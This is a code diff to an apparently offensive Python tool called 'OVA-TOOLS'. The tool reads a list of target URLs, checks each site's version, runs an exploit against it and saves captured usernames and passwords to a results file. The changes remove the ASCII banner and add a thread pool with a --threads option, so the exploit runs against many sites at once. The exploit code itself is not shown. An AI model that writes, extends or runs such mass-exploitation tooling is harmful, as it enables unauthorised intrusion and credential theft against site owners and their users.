@@ -8,21 +8,16 @@ from colorama import Fore, Style, init
 import logging
 import re
 from tqdm import tqdm
+from concurrent.futures import ThreadPoolExecutor
 
-print('''[#] Create By ::
-   ______      __       _______ ____   ____  _       _____
-  / __ \ \    / /\\     |__   __/ __ \ / __ \| |     / ____|
- | |  | \ \  / /  \\ ______| | | |  | | |  | | |    | (___
- | |  | |\ \/ / /\ \\______| | | |  | | |  | | |     \___ \\
- | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
-  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/
-                          OVA-TOOLS  https://t.me/ovacloud
+
+print('''[#] Created By ::
+               
+              OVA-TOOLS  https://t.me/ovacloud
 ''')
-
 
 init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 logging.getLogger("urllib3").propagate = False
 
 def generate_random_string(length):
@@ -104,11 +99,17 @@ def save_result(target, username, password):
         file.write(result)
     print(Style.RESET_ALL + f"[+] Result saved to exploit_results.txt", end='\r')
 
+def perform_exploit(url):
+    version = check_version(url)
+    exploit_version(url, version)
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('--url-list', help='Path to a text file containing a list of URLs')
-
+    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
+    
     if len(sys.argv) == 1:
+    	
         parser.print_help()
         print()
         sys.exit()
@@ -122,9 +123,8 @@ def main():
         print(Fore.RED + "Error: Please provide a list of URLs using the --url-list option.")
         sys.exit(1)
 
-    for url in tqdm(urls, desc='', unit='URL'):
-        version = check_version(url)
-        exploit_version(url, version)
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        list(tqdm(executor.map(perform_exploit, urls), total=len(urls), desc='Exploiting', unit='URL', ncols=80))
 
     print(Style.RESET_ALL + f"\n[+] Task complete")
 
